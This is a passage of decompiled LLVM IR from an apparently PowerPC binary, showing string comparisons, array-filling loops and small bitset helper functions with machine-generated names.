dec_label_pc_1000b018:                            ; preds = %dec_label_pc_1000b004
  %v3_1000b010 = icmp eq i8 %v2_1000b004, 10
  %v3_1000b018 = load i32, i32* @global_var_1001044c, align 4
  %v2_1000b01c = add i32 %v3_1000b018, %v1_1000b00c
  %v3_1000b01c = inttoptr i32 %v2_1000b01c to i16*
  %v4_1000b01c = load i16, i16* %v3_1000b01c, align 2
  %v1_1000b020 = and i16 %v4_1000b01c, 32
  %v3_1000b020.not = icmp ne i16 %v1_1000b020, 0
  %brmerge27 = or i1 %v3_1000b010, %v3_1000b020.not
  br i1 %brmerge27, label %dec_label_pc_1000affc, label %dec_label_pc_1000b02c

dec_label_pc_1000b02c:                            ; preds = %dec_label_pc_1000b018, %dec_label_pc_1000b004
  %v0_1000b02c = load i32, i32* @r27, align 4
  %v1_1000b02c = add i32 %v0_1000b02c, 1
  store i32 %v1_1000b02c, i32* @r27, align 4
  %v2_1000b030 = load i8, i8* %v1_1000b004, align 1
  %v3_1000b034 = icmp eq i8 %v2_1000b030, 0
  br i1 %v3_1000b034, label %dec_label_pc_1000b044, label %dec_label_pc_1000b03c

dec_label_pc_1000b03c:                            ; preds = %dec_label_pc_1000afa8, %dec_label_pc_1000b02c
  %v0_1000afc8 = phi i32 [ %v0_1000b030, %dec_label_pc_1000b02c ], [ %v0_1000b0309, %dec_label_pc_1000afa8 ]
  %v0_1000afbc = phi i32 [ %v1_1000b02c, %dec_label_pc_1000b02c ], [ 0, %dec_label_pc_1000afa8 ]
  %tmp33 = icmp slt i32 %v0_1000afbc, 5
  br i1 %tmp33, label %dec_label_pc_1000afbc, label %dec_label_pc_1000b044

dec_label_pc_1000b044:                            ; preds = %dec_label_pc_1000b02c, %dec_label_pc_1000b03c, %dec_label_pc_1000afa8
  store i32 %tmp, i32* @r30, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1000f360.312 to i32), i32* @r4, align 4
  store i32 1, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v4_1000b058 = call i32 @function_1000ba8c(i8* %v3_1000b058, i32 ptrtoint ([11 x i8]* @global_var_1000f360.312 to i32))
  store i32 %v4_1000b058, i32* %r3.global-to-local, align 4
  %v3_1000b05c = icmp eq i32 %v4_1000b058, 0
  br i1 %v3_1000b05c, label %dec_label_pc_1000b088, label %dec_label_pc_1000b0ac

dec_label_pc_1000b068:                            ; preds = %dec_label_pc_1000b0a0
  %v1_1000b068 = add i32 %v2_1000b090, 24
  %v2_1000b068 = inttoptr i32 %v1_1000b068 to i32*
  %v3_1000b068 = load i32, i32* %v2_1000b068, align 4
  store i32 %v3_1000b068, i32* %r3.global-to-local, align 4
  store i32 268480624, i32* @lr, align 4
  %v1_1000b06c = call i32 @function_100073b0(i32 %v3_1000b068)
  store i32 %v1_1000b06c, i32* %r3.global-to-local, align 4
  %v0_1000b074 = load i32, i32* @r29, align 4
  %v1_1000b074 = add i32 %v0_1000b074, 1
  store i32 %v1_1000b074, i32* %r11.global-to-local, align 4
  %v1_1000b078 = mul i32 %v0_1000b074, 4
  store i32 %v1_1000b074, i32* @global_var_100104c8.251, align 4
  %v3_1000b084 = add i32 %v1_1000b078, ptrtoint (i32* @global_var_10012d4c.252 to i32)
  %v4_1000b084 = inttoptr i32 %v3_1000b084 to i32*
  store i32 %v1_1000b06c, i32* %v4_1000b084, align 4
  br label %dec_label_pc_1000b088

dec_label_pc_1000b088:                            ; preds = %dec_label_pc_1000b044, %dec_label_pc_1000b068
  %v0_1000b088 = load i32, i32* @r31, align 4
  %v1_1000b088 = load i32, i32* @r27, align 4
  %v2_1000b088 = icmp slt i32 %v0_1000b088, %v1_1000b088
  %v1_1000b08c = mul i32 %v0_1000b088, 4
  %v0_1000b090 = load i32, i32* @r1, align 4
  %v2_1000b090 = add i32 %v0_1000b090, %v1_1000b08c
  br i1 %v2_1000b088, label %dec_label_pc_1000b0a0, label %dec_label_pc_1000b0ac

dec_label_pc_1000b0a0:                            ; preds = %dec_label_pc_1000b088
  %v3_1000b0a0 = load i32, i32* @global_var_100104c8.251, align 4
  %tmp35 = icmp slt i32 %v3_1000b0a0, 3
  br i1 %tmp35, label %dec_label_pc_1000b068, label %dec_label_pc_1000b0ac

dec_label_pc_1000b0ac:                            ; preds = %dec_label_pc_1000b0a0, %dec_label_pc_1000b088, %dec_label_pc_1000b044
  %v0_1000b0b0 = load i32, i32* @r30, align 4
  store i32 %v0_1000b0b0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000f36c.313 to i32), i32* @r4, align 4
  %v3_1000b0b8 = inttoptr i32 %v0_1000b0b0 to i8*
  %v4_1000b0b8 = call i32 @function_1000ba8c(i8* %v3_1000b0b8, i32 ptrtoint ([7 x i8]* @global_var_1000f36c.313 to i32))
  store i32 %v4_1000b0b8, i32* %r3.global-to-local, align 4
  %v3_1000b0bc = icmp eq i32 %v4_1000b0b8, 0
  br i1 %v3_1000b0bc, label %dec_label_pc_1000b0fc.preheader, label %dec_label_pc_1000b0c4

dec_label_pc_1000b0c4:                            ; preds = %dec_label_pc_1000b0ac
  %v0_1000b0c8 = load i32, i32* @r30, align 4
  store i32 %v0_1000b0c8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000f374.314 to i32), i32* @r4, align 4
  %v3_1000b0d0 = inttoptr i32 %v0_1000b0c8 to i8*
  %v4_1000b0d0 = call i32 @function_1000ba8c(i8* %v3_1000b0d0, i32 ptrtoint ([7 x i8]* @global_var_1000f374.314 to i32))
  store i32 %v4_1000b0d0, i32* %r3.global-to-local, align 4
  %v3_1000b0d4 = icmp eq i32 %v4_1000b0d0, 0
  br i1 %v3_1000b0d4, label %dec_label_pc_1000b0fc.preheader, label %dec_label_pc_1000b168.backedge

dec_label_pc_1000b0fc.preheader:                  ; preds = %dec_label_pc_1000b0ac, %dec_label_pc_1000b0c4
  store i32 ptrtoint (i32* @global_var_10012d3c.301 to i32), i32* @r31, align 4
  %v3_1000b10841 = load i32, i32* @global_var_100104cc.299, align 4
  %v2_1000b10c43 = icmp sgt i32 %v3_1000b10841, 0
  %v1_1000b11045 = add i32 %v3_1000b10841, -1
  %v1_1000b11446 = mul i32 %v1_1000b11045, 4
  store i32 %v1_1000b11446, i32* %r11.global-to-local, align 4
  br i1 %v2_1000b10c43, label %dec_label_pc_1000b0e0, label %dec_label_pc_1000b11c

dec_label_pc_1000b0e0:                            ; preds = %dec_label_pc_1000b0fc.preheader, %dec_label_pc_1000b0e0
  %v1_1000b11448 = phi i32 [ %v1_1000b114, %dec_label_pc_1000b0e0 ], [ %v1_1000b11446, %dec_label_pc_1000b0fc.preheader ]
  %v1_1000b11047 = phi i32 [ %v1_1000b110, %dec_label_pc_1000b0e0 ], [ %v1_1000b11045, %dec_label_pc_1000b0fc.preheader ]
  %v2_1000b0e0 = add i32 %v1_1000b11448, ptrtoint (i32* @global_var_10012d3c.301 to i32)
  %v3_1000b0e0 = inttoptr i32 %v2_1000b0e0 to i32*
  %v4_1000b0e0 = load i32, i32* %v3_1000b0e0, align 4
  store i32 %v4_1000b0e0, i32* %r3.global-to-local, align 4
  store i32 %v1_1000b11047, i32* @global_var_100104cc.299, align 4
  store i32 268480748, i32* @lr, align 4
  %v1_1000b0e8 = call i32 @function_10007e48(i32 %v4_1000b0e0)
  store i32 %v1_1000b0e8, i32* %r3.global-to-local, align 4
  %v3_1000b0ec = load i32, i32* @global_var_100104cc.299, align 4
  %v1_1000b0f4 = mul i32 %v3_1000b0ec, 4
  %v1_1000b0f8 = load i32, i32* @r31, align 4
  %v3_1000b0f8 = add i32 %v1_1000b0f8, %v1_1000b0f4
  %v4_1000b0f8 = inttoptr i32 %v3_1000b0f8 to i32*
  store i32 0, i32* %v4_1000b0f8, align 4
  store i32 ptrtoint (i32* @global_var_10012d3c.301 to i32), i32* @r31, align 4
  %v3_1000b108 = load i32, i32* @global_var_100104cc.299, align 4
  %v2_1000b10c = icmp sgt i32 %v3_1000b108, 0
  %v1_1000b110 = add i32 %v3_1000b108, -1
  %v1_1000b114 = mul i32 %v1_1000b110, 4
  store i32 %v1_1000b114, i32* %r11.global-to-local, align 4
  br i1 %v2_1000b10c, label %dec_label_pc_1000b0e0, label %dec_label_pc_1000b11c

dec_label_pc_1000b11c:                            ; preds = %dec_label_pc_1000b0e0, %dec_label_pc_1000b0fc.preheader
  %v3_1000b15c59 = phi i32 [ %v3_1000b10841, %dec_label_pc_1000b0fc.preheader ], [ %v3_1000b108, %dec_label_pc_1000b0e0 ]
  %v1_1000b14449 = load i32, i32* @r27, align 4
  %v2_1000b14450 = icmp sgt i32 %v1_1000b14449, 1
  %v0_1000b14c53 = load i32, i32* @r1, align 4
  %v2_1000b14c54 = add i32 %v0_1000b14c53, 4
  br i1 %v2_1000b14450, label %dec_label_pc_1000b15c, label %dec_label_pc_1000b168.backedge

dec_label_pc_1000b124:                            ; preds = %dec_label_pc_1000b15c
  %v1_1000b124 = add i32 %v2_1000b14c55, 24
  %v2_1000b124 = inttoptr i32 %v1_1000b124 to i32*
  %v3_1000b124 = load i32, i32* %v2_1000b124, align 4
  store i32 %v3_1000b124, i32* %r3.global-to-local, align 4
  store i32 268480812, i32* @lr, align 4
  %v1_1000b128 = call i32 @function_100073b0(i32 %v3_1000b124)
  store i32 %v1_1000b128, i32* %r3.global-to-local, align 4
  %v0_1000b130 = load i32, i32* @r29, align 4
  %v1_1000b130 = add i32 %v0_1000b130, 1
  store i32 %v1_1000b130, i32* %r11.global-to-local, align 4
  %v1_1000b134 = mul i32 %v0_1000b130, 4
  store i32 %v1_1000b130, i32* @global_var_100104cc.299, align 4
  %v3_1000b140 = add i32 %v1_1000b134, ptrtoint (i32* @global_var_10012d3c.301 to i32)
  %v4_1000b140 = inttoptr i32 %v3_1000b140 to i32*
  store i32 %v1_1000b128, i32* %v4_1000b140, align 4
  %v0_1000b144.pre = load i32, i32* @r31, align 4
  %v1_1000b144 = load i32, i32* @r27, align 4
  %v2_1000b144 = icmp slt i32 %v0_1000b144.pre, %v1_1000b144
  br i1 %v2_1000b144, label %dec_label_pc_1000b124.dec_label_pc_1000b15c_crit_edge, label %dec_label_pc_1000b168.backedge

dec_label_pc_1000b124.dec_label_pc_1000b15c_crit_edge: ; preds = %dec_label_pc_1000b124
  %v0_1000b14c = load i32, i32* @r1, align 4
  %v1_1000b148 = mul i32 %v0_1000b144.pre, 4
  %v2_1000b14c = add i32 %v0_1000b14c, %v1_1000b148
  %v3_1000b15c.pre = load i32, i32* @global_var_100104cc.299, align 4
  br label %dec_label_pc_1000b15c

dec_label_pc_1000b15c:                            ; preds = %dec_label_pc_1000b11c, %dec_label_pc_1000b124.dec_label_pc_1000b15c_crit_edge
  %v3_1000b15c = phi i32 [ %v3_1000b15c.pre, %dec_label_pc_1000b124.dec_label_pc_1000b15c_crit_edge ], [ %v3_1000b15c59, %dec_label_pc_1000b11c ]
  %v2_1000b14c55 = phi i32 [ %v2_1000b14c, %dec_label_pc_1000b124.dec_label_pc_1000b15c_crit_edge ], [ %v2_1000b14c54, %dec_label_pc_1000b11c ]
  %tmp37 = icmp slt i32 %v3_1000b15c, 4
  br i1 %tmp37, label %dec_label_pc_1000b124, label %dec_label_pc_1000b168.backedge

dec_label_pc_1000b168:                            ; preds = %dec_label_pc_1000b168.backedge, %dec_label_pc_1000b168.preheader
  %v0_1000b174 = phi i32 [ %v0_1000b174.pre, %dec_label_pc_1000b168.backedge ], [ %v0_1000b17416, %dec_label_pc_1000b168.preheader ]
  store i32 %v2_1000b168, i32* %r3.global-to-local, align 4
  store i32 268480892, i32* @lr, align 4
  %v3_1000b178 = call i32 @function_10006660(i32 %v2_1000b168, i32 128, i32 %v0_1000b174)
  store i32 %v3_1000b178, i32* %r3.global-to-local, align 4
  %v3_1000b17c = icmp eq i32 %v3_1000b178, 0
  br i1 %v3_1000b17c, label %dec_label_pc_1000b18c, label %dec_label_pc_1000af74.preheader

dec_label_pc_1000af74.preheader:                  ; preds = %dec_label_pc_1000b168
  store i32 %v2_1000b168, i32* %r3.global-to-local, align 4
  %v2_1000af743 = load i8, i8* %v1_1000af742, align 4
  %v3_1000af744 = zext i8 %v2_1000af743 to i32
  store i32 %v3_1000af744, i32* %r11.global-to-local, align 4
  %v3_1000af7c6 = icmp eq i8 %v2_1000af743, 0
  br i1 %v3_1000af7c6, label %dec_label_pc_1000b168.backedge, label %dec_label_pc_1000af88.lr.ph

dec_label_pc_1000af88.lr.ph:                      ; preds = %dec_label_pc_1000af74.preheader
  %v3_1000af88.pre = load i32, i32* @global_var_1001044c, align 4
  br label %dec_label_pc_1000af88

dec_label_pc_1000b18c:                            ; preds = %dec_label_pc_1000b168
  %v0_1000b18c = load i32, i32* @r26, align 4
  store i32 %v0_1000b18c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000b194.315 to i32), i32* @lr, align 4
  %v1_1000b190 = inttoptr i32 %v0_1000b18c to i16*
  %v2_1000b190 = call i32 @function_10004b54(i16* %v1_1000b190)
  store i32 %v2_1000b190, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b1a4

dec_label_pc_1000b198:                            ; preds = %dec_label_pc_1000af54
  %v0_1000b198 = call i32 @function_10009548()
  store i32 %v0_1000b198, i32* %r3.global-to-local, align 4
  %v2_1000b1a0 = inttoptr i32 %v0_1000b198 to i32*
  store i32 3, i32* %v2_1000b1a0, align 4
  br label %dec_label_pc_1000b1a4

dec_label_pc_1000b1a4:                            ; preds = %dec_label_pc_1000aef0, %dec_label_pc_1000b18c, %dec_label_pc_1000b198
  store i32 %v2_1000af10, i32* @r3, align 4
  %v0_1000b1ac = call i32 @function_10008c84()
  store i32 %v0_1000b1ac, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000b1ac

; uselistorder directives
  uselistorder i32 %v3_1000af744, { 2, 0, 1 }
  uselistorder i32 %v1_1000b11446, { 1, 0 }
  uselistorder i32 %v1_1000b11045, { 1, 0 }
  uselistorder i32 %v0_1000afbc, { 1, 0 }
  uselistorder i32 %v1_1000b00c, { 1, 0 }
  uselistorder i8* %v1_1000b004, { 0, 2, 1 }
  uselistorder i8 %v2_1000afd4, { 2, 0, 1 }
  uselistorder i32 %v0_1000afd0, { 0, 1, 3, 2 }
  uselistorder i32 %v3_1000af74, { 1, 0, 2 }
  uselistorder i32 %v1_1000af70, { 0, 2, 1 }
  uselistorder i32 %v2_1000b168, { 1, 3, 2, 0 }
  uselistorder i32 %v2_1000af10, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 29, 19, 20, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 1, 16, 17, 27, 18, 28, 0, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r11.global-to-local, { 8, 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32 ()* @function_10009548, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32)* @function_10007e48, { 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 18, 17, 1, 21, 20, 19, 0 }
  uselistorder i32* @global_var_100104cc.299, { 0, 2, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 ptrtoint (i32* @global_var_10012d3c.301 to i32), { 3, 5, 1, 0, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_10012d4c.252 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100103e0.250 to i32), { 0, 2, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_1000b1a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b15c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b0e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b0fc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000b088, { 1, 0 }
  uselistorder label %dec_label_pc_1000b044, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b03c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b004, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000afd4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b168.backedge, { 4, 3, 2, 1, 7, 6, 5, 0 }
  uselistorder label %dec_label_pc_1000b168.preheader, { 1, 0 }
}

define i32 @function_1000b1c4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1000b1c4:
  %stack_var_0 = alloca i32, align 4
  %v4_1000b1c8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg6, i32* @r10, align 4
  store i32 %arg5, i32* @r29, align 4
  store i32 268481032, i32* @lr, align 4
  %v9_1000b204 = inttoptr i32 %arg3 to i32*
  %v10_1000b204 = call i32 @function_1000c698(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_1000b204, i32 %arg4, i32 %arg5, i32 %v4_1000b1c8, i32 %arg7)
  ret i32 %v10_1000b204
}

define i32 @function_1000b21c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000b21c:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000b230 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268481092, i32* @lr, align 4
  %v2_1000b240 = call i32 @function_10008fe4(i32 9, i32 %v2_1000b230)
  ret i32 %v2_1000b240

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_10008fe4, { 6, 4, 8, 7, 3, 2, 5, 1, 0 }
}

define i32 @function_1000b254(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b254:
  %r0.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_1000b258 = load i32, i32* @lr, align 4
  store i32 %v0_1000b258, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000b264 = icmp eq i32* %arg2, null
  store i32 %arg3, i32* %r30.global-to-local, align 4
  %v1_1000b274 = add i32 %tmp, 4
  store i32 %v1_1000b274, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_1000b27c = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_1000b27c, i32* @r3, align 4
  br i1 %v3_1000b264, label %dec_label_pc_1000b2a4, label %dec_label_pc_1000b284

dec_label_pc_1000b284:                            ; preds = %dec_label_pc_1000b254
  %v2_1000b284 = load i32, i32* %arg2, align 4
  store i32 %v2_1000b284, i32* %r0.global-to-local, align 4
  store i32 268481168, i32* @lr, align 4
  %v0_1000b28c = call i32 @function_10006d8c()
  %v0_1000b290 = load i32, i32* @r31, align 4
  %v1_1000b290 = add i32 %v0_1000b290, 132
  %v2_1000b290 = inttoptr i32 %v1_1000b290 to i32*
  %v3_1000b290 = load i32, i32* %v2_1000b290, align 4
  store i32 %v3_1000b290, i32* %r0.global-to-local, align 4
  %v1_1000b29c = add i32 %v0_1000b290, 136
  %v2_1000b29c = inttoptr i32 %v1_1000b29c to i32*
  %v3_1000b29c = load i32, i32* %v2_1000b29c, align 4
  store i32 %v3_1000b29c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000b2a4

dec_label_pc_1000b2a4:                            ; preds = %dec_label_pc_1000b254, %dec_label_pc_1000b284
  store i32 268481220, i32* @lr, align 4
  %v0_1000b2c0 = call i32 @function_1000b564()
  %v0_1000b2c4 = load i32, i32* %r30.global-to-local, align 4
  %v3_1000b2c4 = icmp eq i32 %v0_1000b2c4, 0
  store i32 %v0_1000b2c0, i32* @r31, align 4
  br i1 %v3_1000b2c4, label %dec_label_pc_1000b300, label %dec_label_pc_1000b2d4

dec_label_pc_1000b2d4:                            ; preds = %dec_label_pc_1000b2a4
  %v1_1000b2cc = icmp slt i32 %v0_1000b2c0, 0
  %v1_1000b2d4 = add i32 %v0_1000b2c4, 4
  store i32 %v1_1000b2d4, i32* @r3, align 4
  %v2_1000b2d8 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1000b2d8, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_1000b2cc, label %dec_label_pc_1000b300, label %dec_label_pc_1000b2e4

dec_label_pc_1000b2e4:                            ; preds = %dec_label_pc_1000b2d4
  %v3_1000b2e4 = load i32, i32* %stack_var_-172, align 4
  store i32 %v3_1000b2e4, i32* %r0.global-to-local, align 4
  %v2_1000b2e8 = inttoptr i32 %v0_1000b2c4 to i32*
  store i32 %v3_1000b2e4, i32* %v2_1000b2e8, align 4
  store i32 268481264, i32* @lr, align 4
  %v0_1000b2ec = call i32 @function_10006d8c()
  %v1_1000b2f8 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000b2f8 = add i32 %v1_1000b2f8, 136
  %v3_1000b2f8 = inttoptr i32 %v2_1000b2f8 to i32*
  %v0_1000b2fc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b2fc = load i32, i32* %r30.global-to-local, align 4
  %v2_1000b2fc = add i32 %v1_1000b2fc, 132
  %v3_1000b2fc = inttoptr i32 %v2_1000b2fc to i32*
  store i32 %v0_1000b2fc, i32* %v3_1000b2fc, align 4
  %v0_1000b304.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000b300

dec_label_pc_1000b300:                            ; preds = %dec_label_pc_1000b2d4, %dec_label_pc_1000b2a4, %dec_label_pc_1000b2e4
  %v0_1000b304 = phi i32 [ %v0_1000b2c0, %dec_label_pc_1000b2d4 ], [ %v0_1000b2c0, %dec_label_pc_1000b2a4 ], [ %v0_1000b304.pre, %dec_label_pc_1000b2e4 ]
  store i32 %v0_1000b258, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000b304

; uselistorder directives
  uselistorder i32 %v0_1000b2c0, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1000b300, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b2a4, { 1, 0 }
}

define i32 @function_1000b318(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000b318:
  %v1_1000b318 = add i32 %arg2, -1
  %v1_1000b31c = call i32 @__asm_rlwinm(i32 %v1_1000b318, i32 29, i32 3, i32 29)
  %v1_1000b320 = urem i32 %v1_1000b318, 32
  %v2_1000b324 = add i32 %v1_1000b31c, %arg1
  %v3_1000b324 = inttoptr i32 %v2_1000b324 to i32*
  %v4_1000b324 = load i32, i32* %v3_1000b324, align 4
  %v3_1000b32c = shl i32 1, %v1_1000b320
  %v2_1000b330 = and i32 %v4_1000b324, %v3_1000b32c
  %v2_1000b334 = icmp ne i32 %v2_1000b330, 0
  %v5_1000b338 = zext i1 %v2_1000b334 to i32
  ret i32 %v5_1000b338
}

define i32 @function_1000b340(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b340:
  %v1_1000b340 = add i32 %arg2, -1
  %v1_1000b348 = call i32 @__asm_rlwinm(i32 %v1_1000b340, i32 29, i32 3, i32 29)
  %v1_1000b34c = urem i32 %v1_1000b340, 32
  %v2_1000b350 = add i32 %v1_1000b348, %arg1
  %v3_1000b350 = inttoptr i32 %v2_1000b350 to i32*
  %v4_1000b350 = load i32, i32* %v3_1000b350, align 4
  %v3_1000b354 = shl i32 1, %v1_1000b34c
  %v2_1000b358 = or i32 %v3_1000b354, %v4_1000b350
  store i32 %v2_1000b358, i32* %v3_1000b350, align 4
  ret i32 0
}

define i32 @function_1000b368(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000b368:
  %v1_1000b368 = add i32 %arg2, -1
  %v1_1000b370 = call i32 @__asm_rlwinm(i32 %v1_1000b368, i32 29, i32 3, i32 29)
  %v1_1000b374 = urem i32 %v1_1000b368, 32
  %v2_1000b378 = add i32 %v1_1000b370, %arg1
  %v3_1000b378 = inttoptr i32 %v2_1000b378 to i32*
  %v4_1000b378 = load i32, i32* %v3_1000b378, align 4
  %v3_1000b37c = shl i32 -2, %v1_1000b374
  %v4_1000b37c = sub nsw i32 32, %v1_1000b374
  %v5_1000b37c = lshr i32 -2, %v4_1000b37c
  %v6_1000b37c = or i32 %v5_1000b37c, %v3_1000b37c
  %v2_1000b380 = and i32 %v6_1000b37c, %v4_1000b378
  store i32 %v2_1000b380, i32* %v3_1000b378, align 4
  ret i32 0
}

define i32 @function_1000b390(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000b3c4.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v0_1000b3a8 = call i32 @function_10008c7c()
  %v2_1000b3b0 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1000b3b0, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v3_1000b3c834 = add i32 %v2_1000b3b0, 124
  %v4_1000b3c835 = inttoptr i32 %v3_1000b3c834 to i32*
  store i32 0, i32* %v4_1000b3c835, align 4
  %v0_1000b3cc36 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b3cc37 = add i32 %v0_1000b3cc36, -1
  store i32 %v1_1000b3cc37, i32* %r9.global-to-local, align 4
  %v0_1000b3d038 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b3d039 = add i32 %v0_1000b3d038, -1
  store i32 %v1_1000b3d039, i32* %ctr.global-to-local, align 4
  %v2_1000b3d040 = icmp eq i32 %v1_1000b3d039, 0
  br i1 %v2_1000b3d040, label %dec_label_pc_1000b3d4, label %dec_label_pc_1000b3c4.dec_label_pc_1000b3c4_crit_edge

dec_label_pc_1000b3c4.dec_label_pc_1000b3c4_crit_edge: ; preds = %dec_label_pc_1000b3c4.lr.ph, %dec_label_pc_1000b3c4.dec_label_pc_1000b3c4_crit_edge
  %v1_1000b3cc41 = phi i32 [ %v1_1000b3cc, %dec_label_pc_1000b3c4.dec_label_pc_1000b3c4_crit_edge ], [ %v1_1000b3cc37, %dec_label_pc_1000b3c4.lr.ph ]
  %v0_1000b3c8.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b3c8.pre = load i32, i32* %r29.global-to-local, align 4
  %v1_1000b3c4 = mul i32 %v1_1000b3cc41, 4
  %v3_1000b3c8 = add i32 %v1_1000b3c4, %v1_1000b3c8.pre
  %v4_1000b3c8 = inttoptr i32 %v3_1000b3c8 to i32*
  store i32 %v0_1000b3c8.pre, i32* %v4_1000b3c8, align 4
  %v0_1000b3cc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b3cc = add i32 %v0_1000b3cc, -1
  store i32 %v1_1000b3cc, i32* %r9.global-to-local, align 4
  %v0_1000b3d0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b3d0 = add i32 %v0_1000b3d0, -1
  store i32 %v1_1000b3d0, i32* %ctr.global-to-local, align 4
  %v2_1000b3d0 = icmp eq i32 %v1_1000b3d0, 0
  br i1 %v2_1000b3d0, label %dec_label_pc_1000b3d4, label %dec_label_pc_1000b3c4.dec_label_pc_1000b3c4_crit_edge

dec_label_pc_1000b3d4:                            ; preds = %dec_label_pc_1000b3c4.dec_label_pc_1000b3c4_crit_edge, %dec_label_pc_1000b3c4.lr.ph
  %v1_1000b3cc.lcssa = phi i32 [ %v1_1000b3cc37, %dec_label_pc_1000b3c4.lr.ph ], [ %v1_1000b3cc, %dec_label_pc_1000b3c4.dec_label_pc_1000b3c4_crit_edge ]
  %v3_1000b3dc = call i32 @function_1000b340(i32 %v2_1000b3b0, i32 6, i32 %v1_1000b3cc.lcssa)
  %v3_1000b3e0 = icmp eq i32 %v3_1000b3dc, 0
  br i1 %v3_1000b3e0, label %dec_label_pc_1000b3e8, label %dec_label_pc_1000b3f8

dec_label_pc_1000b3e8:                            ; preds = %dec_label_pc_1000b3d4
  store i32 268481528, i32* @lr, align 4
  %v3_1000b3f4 = call i32 @function_10009488(i32 1, i32 %v2_1000b3b0, i32 0)
  br label %dec_label_pc_1000b3f8

dec_label_pc_1000b3f8:                            ; preds = %dec_label_pc_1000b3d4, %dec_label_pc_1000b3e8
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_1000b3fc = load i32, i32* @global_var_100104d0.319, align 4
  %v3_1000b400 = icmp eq i32 %v3_1000b3fc, 0
  br i1 %v3_1000b400, label %dec_label_pc_1000b408, label %dec_label_pc_1000b430

dec_label_pc_1000b408:                            ; preds = %dec_label_pc_1000b3f8
  store i32 1, i32* @global_var_100104d0.319, align 4
  br label %dec_label_pc_1000b410

dec_label_pc_1000b410:                            ; preds = %dec_label_pc_1000b48c, %dec_label_pc_1000b408
  store i32 ptrtoint (i32* @global_var_100103f8.317 to i32), i32* %r29.global-to-local, align 4
  %v0_1000b41c = call i32 @function_10008c7c()
  store i32 268481576, i32* @lr, align 4
  %v1_1000b424 = call i32 @function_1000c9b4(i32 6)
  %v0_1000b42c = call i32 @function_10008c7c()
  %v3_1000b434.pre = load i32, i32* @global_var_100104d0.319, align 4
  br label %dec_label_pc_1000b430

dec_label_pc_1000b430:                            ; preds = %dec_label_pc_1000b3f8, %dec_label_pc_1000b410
